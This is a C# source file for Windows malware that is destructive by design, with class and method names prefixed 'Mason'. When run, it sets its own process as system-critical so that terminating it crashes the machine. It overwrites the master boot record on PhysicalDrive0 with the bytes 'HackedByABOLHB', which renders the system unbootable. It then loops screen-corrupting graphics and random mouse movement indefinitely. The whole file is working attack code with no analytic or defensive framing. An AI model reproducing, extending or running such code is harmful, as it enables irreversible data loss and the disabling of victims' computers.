using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
class MasonClass
{
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetDC(IntPtr hWnd);
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
    [DllImport("gdi32.dll", CharSet = CharSet.Auto)]
    static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
    [DllImport("user32.dll")]
    static extern int GetSystemMetrics(int nIndex);
    [DllImport("user32.dll")]
    static extern void SetCursorPos(int X, int Y);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateFile(
        string lpFileName,
        uint dwDesiredAccess,
        uint dwShareMode,
        IntPtr lpSecurityAttributes,
        uint dwCreationDisposition,
        uint dwFlagsAndAttributes,
        IntPtr hTemplateFile);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteFile(
        IntPtr hFile,
        byte[] lpBuffer,
        uint nNumberOfBytesToWrite,
        out uint lpNumberOfBytesWritten,
        IntPtr lpOverlapped);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr hObject);
    const int SM_CXSCREEN = 0;
    const int SM_CYSCREEN = 1;
    const uint NOTSRCERASE = 0x001100A6;
    const uint GENERIC_WRITE = 0x40000000;
    const uint OPEN_EXISTING = 3;
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);
    private const int ProcessInformationClass = 29;
    static void Main()
    {
        Process currentProcess = Process.GetCurrentProcess();
        IntPtr handle = currentProcess.Handle;
        int isCritical = 1; 
        NtSetInformationProcess(handle, ProcessInformationClass, ref isCritical, sizeof(int));
        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
        MasonWriteMBR();
        MasonStartEffect(screenWidth, screenHeight);
        MasonMoveMouseRandomly(screenWidth, screenHeight);
        while (true)
        {
            Thread.Sleep(1000);
        }
    }
    static void MasonWriteMBR()
    {
        byte[] mbrData = new byte[]
        {
            0x48, 0x61, 0x63, 0x6B, 0x65, 0x64, 0x42, 0x79,
            0x41, 0x42, 0x4F, 0x4C, 0x48, 0x42
        };

        IntPtr hDevice = CreateFile(
            @"\\.\PhysicalDrive0",
            GENERIC_WRITE,
            0,
            IntPtr.Zero,
            OPEN_EXISTING,
            0,
            IntPtr.Zero);

        if (hDevice != IntPtr.Zero)
        {
            WriteFile(hDevice, mbrData, (uint)mbrData.Length, out _, IntPtr.Zero);
            CloseHandle(hDevice);
        }
    }
    static void MasonStartEffect(int screenWidth, int screenHeight)
    {
        Random rand = new Random();
        new Thread(() =>
        {
            while (true)
            {
                IntPtr hdc = GetDC(IntPtr.Zero);
                BitBlt(hdc, rand.Next(15), rand.Next(15), screenWidth, screenHeight, hdc, rand.Next(15), rand.Next(15), NOTSRCERASE);
                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(10);
            }
        }).Start();
    }
    static void MasonMoveMouseRandomly(int screenWidth, int screenHeight)
    {
        Random rand = new Random();

        new Thread(() =>
        {
            while (true)
            {
                int x = rand.Next(0, screenWidth);
                int y = rand.Next(0, screenHeight);
                SetCursorPos(x, y);
                Thread.Sleep(300);
            }
        }).Start();
    }
}
